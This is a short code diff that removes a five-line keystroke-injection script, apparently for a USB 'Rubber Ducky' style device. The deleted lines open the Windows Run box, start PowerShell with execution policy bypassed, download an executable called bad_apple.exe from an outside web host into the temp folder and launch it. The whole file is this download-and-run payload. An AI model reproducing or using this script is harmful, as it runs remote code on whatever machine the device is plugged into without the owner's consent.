@@ -1,5 +1,0 @@
-DELAY 200
-GUI r
-DELAY 500
-STRING powershell -ExecutionPolicy Bypass -NoProfile -Command "$url='https://mon.im/bad_apple.exe';$file=$env:TEMP+'\bad_apple.exe';Invoke-WebRequest $url -OutFile $file;Start-Process $file;exit"
-ENTER
